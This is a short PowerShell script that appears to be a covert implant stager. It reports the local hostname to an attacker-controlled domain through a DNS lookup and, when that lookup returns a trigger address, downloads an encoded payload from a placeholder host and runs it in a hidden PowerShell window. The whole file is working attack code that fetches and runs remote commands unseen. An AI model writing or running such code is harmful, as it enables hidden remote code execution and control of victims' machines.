$domain="ourdomain.nl";
function replaceBadChars($item){
    $item = $item.Replace("_", "");
    $item = $item.Replace("+", "");
    $item = $item.Replace("=", "");
    $item = $item.Replace(".", "");
    return $item;
}

function callShell(){
$dl = (New-Object Net.WebClient).DownloadString('https://location.of.our.shell/data');
powershell -window hidden -enc $dl;
}


$hostname = [System.Net.Dns]::GetHostName();
$hostname = replaceBadChars($hostname);

$seed = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_});
$queryDomain = $hostname +"." +$seed+"."+$domain;
$var = [Net.DNS]::GetHostEntry($queryDomain);


if ($var.AddressList.IPAddressToString -eq '10.10.10.4'){
    callShell;
}
